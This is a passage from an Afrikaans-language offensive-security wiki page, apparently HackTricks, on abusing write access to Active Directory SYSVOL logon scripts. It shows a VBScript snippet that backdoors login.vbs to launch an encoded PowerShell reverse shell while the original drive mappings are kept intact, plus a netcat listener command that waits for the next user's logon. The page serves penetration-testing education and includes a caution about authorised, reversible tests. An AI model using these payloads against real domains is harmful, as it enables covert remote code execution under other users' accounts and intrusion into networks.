Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

’n Gemagtigde skryftoets moet teikenspesifiek en omkeerbaar wees, met die oorspronklike skrip gerugsteun en herstel. Moenie ’n werkende aanmeldingskrip oorskryf net om toegang te toets nie; ’n suksesvolle skryfaksie kan tydens die volgende gebruiker se aanmelding uitgevoer word.

### Vergiftig ’n VBScript-aanmeldingskrip vir RCE
Voeg ’n opdrag by wat ’n PowerShell reverse shell (genereer vanaf revshells.com) begin, en behou die oorspronklike logika om te voorkom dat die besigheidsfunksie gebreek word:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Luister op jou host en wag vir die volgende interaktiewe aanmelding:

```bash
rlwrap -cAr nc -lnvp 443
```

Notas:
- Uitvoering vind plaas onder die token van die logging-gebruiker (nie SYSTEM nie). Die omvang is die GPO-skakel (OU, werf, domein) waarop daardie script van toepassing is.
- Maak ná gebruik skoon deur die oorspronklike inhoud/tydstempels te herstel.


## References

- [1] [Misbruik van Active Directory-ACL's/ACE's](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Bevoorregte rekeninge en token-voorregte](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Die ACL-aanvalspad-opdatering](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights-opsomming - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Voorregte-eskalasie met ACL's in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Skandering vir Active Directory-voorregte en bevoorregte rekeninge](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule-konstruktor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD-kenmerk-/UAC-bewerkings vanaf Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (groeplidmaatskap)](https://www.samba.org/)
- [10] [HTB Puppy: AD-ACL-misbruik, KeePassXC Argon2-kraakwerk en DPAPI-dekripsie tot DC-admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Rond en Vind Uit: Kaping van GPO-UNC-paaie vir kode-uitvoering en NTLM-relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: uitbuiting van Active Directory-GPO's deur NTLM-relaying, en meer](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU wat lag? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: uitbuiting van ACL-aanvalvektore in versteekte Organizational Units in Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulering van wettige Active Directory-dienste op die netwerk: die geval van GPO-uitbuiting](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
